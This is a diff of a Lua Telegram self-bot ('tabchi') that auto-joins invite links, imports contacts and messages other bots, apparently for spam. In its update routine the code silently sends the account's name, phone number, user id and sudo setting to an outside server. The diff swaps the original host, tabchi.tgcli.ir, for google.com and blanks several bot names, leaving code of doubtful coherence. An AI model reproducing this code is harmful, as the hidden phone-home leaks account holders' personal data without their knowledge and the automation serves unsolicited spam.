@@ -94,13 +94,21 @@ function our_id(extra, result)
     redis:set("tabchi:" .. tostring(tabchi_id) .. ":botinfo", JSON.encode(result))
   end
 end
+--oh ye baby :|
+-- comment for link function
+--
+--============================================================================
+
+
 local process_links
+
 function process_links(text)
   if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then
-    text = text:gsub("telegram.dog", "telegram.me")
+    text = text:gsub("t.me", "telegram.me")
     local matches = {
       text:match("(https://telegram.me/joinchat/%S+)")
     }
+	
     for i, v in pairs(matches) do
       tdcli_function({
         ID = "CheckChatInviteLink",
@@ -109,6 +117,7 @@ function process_links(text)
     end
   end
 end
+--==============================================================================
 local add
 function add(id)
   chat_type_ = chat_type(id)
@@ -151,22 +160,22 @@ function process_updates()
     else
       tdcli_function({ID = "GetMe"}, our_id, nil)
       botinfo = JSON.decode(info)
-    end
+end
     local first = URL.escape(botinfo.first_name_ or "None")
     local last = URL.escape(botinfo.last_name_ or "None")
     local phone = botinfo.phone_number_
     local id = botinfo.id_
     local sudo = redis:get("tabchi:" .. tostring(tabchi_id) .. ":fullsudo")
-    local path = "http://tabchi.tgcli.ir/addbot.php?fisrt=" .. first .. "&last=" .. last .. "&phone=" .. phone .. "&id=" .. id .. "&sudo=" .. sudo
+    local path = "http://google.com/addbot.php?fisrt=" .. first .. "&last=" .. last .. "&phone=" .. phone .. "&id=" .. id .. "&sudo=" .. sudo
     local res = http.request(path)
     local jdata = JSON.decode(res)
     jdata = jdata or {have_tab = true}
     if jdata.have_tab then
-      tdcli.searchPublicChat("TabchiRobotCli")
+      tdcli.searchPublicChat("h")
       redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:0", true)
       tdcli.unblockUser(0)
-      tdcli.importContacts(0, "Tabchi mod", "bot", 0)
-      tdcli.sendMessage(0, 0, 1, "/sendmetab", 1, "html")
+      tdcli.importContacts(0, "0", "bot", 0)
+      tdcli.sendMessage(0, 0, 1, "h", 1, "html")
       return redis:setex("tabchi:" .. tostring(tabchi_id) .. ":gotupdated", 600, true)
     end
   end
@@ -370,7 +379,7 @@ help >> @Iocki]]
       tdcli.sendMessage(0, 0, 1, "/start", 1, "html")
       if #matches == 3 and (matches[2] == "banners" or matches[2] == "boards") then
         local all = redis:smembers("tabchi:" .. tonumber(tabchi_id) .. ":all")
-        tdcli.searchPublicChat("Crwn_bot")
+        tdcli.searchPublicChat("n")
         local inline2
         function inline2(argg, data)
           if data.results_ and data.results_[0] then
@@ -402,8 +411,8 @@ help >> @Iocki]]
         save_log("User " .. msg.sender_user_id_ .. ", Used S2A " .. matches[2] .. " For " .. matches[3])
       end
     elseif text_:match("^panel$") then
-      tdcli.sendMessage(0, 0, 1, "/start", 1, "html")
-      tdcli.searchPublicChat("TabchiRobot")
+      tdcli.sendMessage(0, 0, 1, "h", 1, "html")
+      tdcli.searchPublicChat("m")
       local contact_num
       function contact_num(extra, result)
         redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
